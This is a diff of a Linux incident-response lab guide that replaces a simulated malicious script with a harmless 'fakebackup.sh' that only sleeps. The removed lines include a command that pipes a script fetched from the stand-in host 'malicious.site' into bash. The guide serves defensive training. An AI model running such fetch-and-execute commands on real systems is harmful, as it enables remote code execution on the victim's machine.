@@ -36,16 +36,34 @@ Your monitoring system flagged a suspicious file in `/tmp`. Upon inspection, it'
 - Ubuntu 20.04/22.04 or Kali Linux
 - Terminal access with sudo privileges
 
-### **Simulate the Incident:**
+### **Simulate teh attack:**
 
-```bash
-echo -e '#!/bin/bash\ncurl http://malicious.site/payload.sh | bash' > /tmp/payload.sh
-chmod +x /tmp/payload.sh
+1. Create a test directory:
 ```
-Execute the script (mimicking a compromised action):
+mkdir ~/script-lab && cd ~/script-lab
+```
+2. Create a Bash script:
 
 ```
-bash /tmp/payload.sh
+nano fakebackup.sh
+```
+3. Paste the following content:
+
+```
+#!/bin/bash
+echo "[*] Simulating backup operation..."
+sleep 60
+```
+4. Make the script executable:
+
+```
+chmod +x fakebackup.sh
+```
+
+5.  Simulate the Attack / Execution
+Run the script in the background:
+```
+./fakebackup.sh &
 ```
 
 ## 🧪 Step-by-Step Investigation
@@ -58,21 +76,13 @@ Ensure auditd, syslog, or basic logging is enabled.
 ### 2. Detection and Analysis
 - Check running processes:
 ```
-ps aux | grep curl
+ps aux | grep fakebackup.sh
 ```
 - Search for suspicious files:
 ```
 find /tmp -name "*.sh"
 ```
-- Review .bash_history for executed commands:
-```
-cat ~/.bash_history | grep payload.sh
-```
-- Check cron entries (to verify no persistence):
-```
-crontab -l
-grep -r "payload.sh" /etc/cron*
-```
+
 ### 3. Containment, Eradication, and Recovery
 - Kill any related processes:
 ```
